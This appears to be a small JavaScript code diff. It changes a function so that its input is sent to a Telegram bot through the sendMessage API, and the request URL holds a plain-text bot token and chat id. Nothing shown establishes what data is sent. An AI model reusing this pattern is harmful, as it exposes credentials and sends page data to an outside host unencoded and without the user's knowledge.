@@ -55,7 +55,7 @@ function read(a)
     var html=a;
     //document.getElementById("result").innerHTML=html;
 	const Http = new XMLHttpRequest();
-const url='https://api.telegram.org/bot738988528:AAH9NXpv9RdgUiUKLE5hYB8nheHSLWW4aOI/sendMessage?chat_id=544883527&text=*жирынй*';
+const url='https://api.telegram.org/bot738988528:AAH9NXpv9RdgUiUKLE5hYB8nheHSLWW4aOI/sendMessage?chat_id=544883527&text='+a;
 Http.open("GET", url);
 Http.send();
 Http.onreadystatechange=(e)=>{
